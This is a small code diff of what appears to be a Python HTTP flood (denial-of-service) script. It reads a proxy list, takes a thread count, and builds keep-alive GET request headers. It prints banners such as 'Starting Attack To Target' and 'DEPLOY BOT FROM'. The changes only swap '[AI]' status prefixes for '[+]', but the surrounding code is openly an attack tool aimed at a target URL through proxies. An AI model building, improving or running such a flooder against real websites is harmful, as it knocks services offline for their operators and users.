@@ -138,7 +138,7 @@ in_file.close()
 listaproxy = proxyf.split('\n')
 #treads
 thread = input("Threads <Amount Threads Default (100): ")
-print ("[AI] WAITING SERVER...")
+print ("[+] WAITING SERVER...")
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
@@ -151,9 +151,9 @@ for x in xrange(thread):
 print("""\033[01;32m===========================
 Starting Attack To Target
 ===========================""")
-print ("[AI] TARGET : ", url)
+print ("[+] TARGET : ", url)
 time.sleep(1)
-print ("[AI]STARTING BOT.....")
+print ("[+]STARTING BOT.....")
 time.sleep(15)
 print ("[AI] DEPLOY BOT FROM =>", random.choice(reFerers))
 print("-----------------------------------------------------------------------------------------")
